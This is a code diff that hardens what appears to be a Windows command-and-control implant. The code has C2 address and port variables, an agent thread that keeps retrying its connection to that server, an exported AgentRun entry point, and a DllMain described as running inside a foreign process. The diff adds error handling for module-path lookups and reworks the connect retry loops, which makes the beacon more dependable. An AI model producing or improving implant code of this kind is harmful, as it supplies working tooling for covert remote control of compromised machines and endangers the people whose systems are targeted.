@@ -43,7 +43,11 @@ static void resolve_key_path(void)
 {
     /* Start from the EXE's own full path */
     char exePath[MAX_PATH] = {0};
-    GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);
+    DWORD pathLen = GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);
+    if (pathLen == 0) {
+        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
+        return;
+    }
 
     /* Strip the filename to get just the directory */
     char *last = strrchr(exePath, '\\');
@@ -381,7 +385,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
 
         /* Retry TCP connect; recreate socket on each failure to avoid
          * using a socket that may have been put into an error state.   */
-        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        for (;;) {
+            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+                break;
             DBG_LOG(DBG_SS_NET, DBG_WARN,
                     "connect(%s:%d) failed (WSAErr=%d) — retrying", _c2_ip_buf, (int)_c2_port, WSAGetLastError());
             closesocket(sock);
@@ -481,8 +487,10 @@ __declspec(dllexport) void AgentRun(void)
     HMODULE hSelf = (HMODULE)_mbi_ar.AllocationBase;
 
     char modPath[MAX_PATH] = {0};
-    if (hSelf)
-        GetModuleFileNameA(hSelf, modPath, sizeof(modPath) - 1);
+    if (hSelf) {
+        DWORD modLen = GetModuleFileNameA(hSelf, modPath, sizeof(modPath) - 1);
+        if (modLen == 0) hSelf = NULL;  /* treat as unresolved on failure */
+    }
 
     char *last = strrchr(modPath, '\\');
     if (last) {
@@ -570,7 +578,9 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
         }
         DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: connecting to %s:%d", _c2_ip_buf, (int)_c2_port);
 
-        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        for (;;) {
+            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+                break;
             DBG_LOG(DBG_SS_NET, DBG_WARN,
                     "_agent_thread: connect(%s:%d) failed (WSAErr=%d) — retrying",
                     _c2_ip_buf, (int)_c2_port, WSAGetLastError());
@@ -644,7 +654,11 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
          * GetModuleFileNameA(hModule) returns the path of our loaded .exe file
          * even when it is loaded as a DLL inside a foreign process.           */
         char modPath[MAX_PATH] = {0};
-        GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);
+        DWORD modLen = GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);
+        if (modLen == 0) {
+            strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
+            return TRUE;
+        }
         char *last = strrchr(modPath, '\\');
         if (last) {
             *(last + 1) = '\0';
